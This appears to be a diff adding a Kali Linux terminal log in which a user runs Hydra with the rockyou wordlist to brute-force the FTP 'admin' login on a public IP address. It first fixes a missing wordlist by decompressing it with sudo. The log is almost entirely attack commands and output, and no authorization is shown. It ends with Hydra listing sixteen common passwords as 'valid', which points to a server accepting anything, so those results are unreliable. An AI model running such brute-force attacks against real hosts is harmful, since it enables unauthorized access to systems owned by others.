@@ -1,0 +1,53 @@
+
+┌──(kali㉿KDDELL)-[/usr/share/legion]
+└─$ ls
+app  CHANGELOG.txt  controller  db  images  legion.conf  legion.py  LICENSE  parsers  __pycache__  scripts  ui  utilities  wordlists
+
+┌──(kali㉿KDDELL)-[/usr/share/legion]
+└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://54.90.164.244
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-13 21:07:16
+[ERROR] File for passwords not found: /usr/share/wordlists/rockyou.txt
+
+┌──(kali㉿KDDELL)-[/usr/share/legion]
+└─$ cd /usr/share/wordlists
+
+┌──(kali㉿KDDELL)-[/usr/share/wordlists]
+└─$ ls
+dirbuster  dnsmap.txt  john.lst  legion  metasploit  nmap.lst  rockyou.txt.gz  sqlmap.txt
+
+┌──(kali㉿KDDELL)-[/usr/share/wordlists]
+└─$ gunzip /usr/share/wordlists/rockyou.txt.gz
+
+gzip: /usr/share/wordlists/rockyou.txt: Permission denied
+
+┌──(kali㉿KDDELL)-[/usr/share/wordlists]
+└─$ sudo gunzip /usr/share/wordlists/rockyou.txt.gz
+[sudo] password for kali:
+
+┌──(kali㉿KDDELL)-[/usr/share/wordlists]
+└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://54.90.164.244
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-13 21:13:35
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking ftp://54.90.164.244:21/
+[21][ftp] host: 54.90.164.244   login: admin   password: 123456
+[21][ftp] host: 54.90.164.244   login: admin   password: 12345
+[21][ftp] host: 54.90.164.244   login: admin   password: 123456789
+[21][ftp] host: 54.90.164.244   login: admin   password: password
+[21][ftp] host: 54.90.164.244   login: admin   password: rockyou
+[21][ftp] host: 54.90.164.244   login: admin   password: 12345678
+[21][ftp] host: 54.90.164.244   login: admin   password: nicole
+[21][ftp] host: 54.90.164.244   login: admin   password: daniel
+[21][ftp] host: 54.90.164.244   login: admin   password: babygirl
+[21][ftp] host: 54.90.164.244   login: admin   password: iloveyou
+[21][ftp] host: 54.90.164.244   login: admin   password: princess
+[21][ftp] host: 54.90.164.244   login: admin   password: 1234567
+[21][ftp] host: 54.90.164.244   login: admin   password: monkey
+[21][ftp] host: 54.90.164.244   login: admin   password: lovely
+[21][ftp] host: 54.90.164.244   login: admin   password: abc123
+[21][ftp] host: 54.90.164.244   login: admin   password: jessica
+1 of 1 target successfully completed, 16 valid passwords found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-07-13 21:13:38
